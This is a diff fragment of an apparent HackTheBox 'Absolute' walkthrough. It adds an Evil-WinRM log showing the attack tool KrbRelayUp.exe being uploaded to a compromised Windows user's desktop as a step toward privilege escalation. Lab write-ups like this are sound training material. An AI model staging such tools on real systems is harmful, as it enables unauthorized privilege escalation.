@@ -655,6 +655,15 @@ Ill download the exe from the above link
 Then upload it to the target
 
 ```python
-
+*Evil-WinRM* PS C:\Users\winrm_user\Desktop> upload KrbRelayUp.exe
+                                        
+Info: Uploading /home/kali/htb/Absolute/KrbRelayUp.exe to C:\Users\winrm_user\Desktop\KrbRelayUp.exe
+                                        
+Data: 1482752 bytes of 1482752 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\winrm_user\Desktop>
 ```
+
+
 
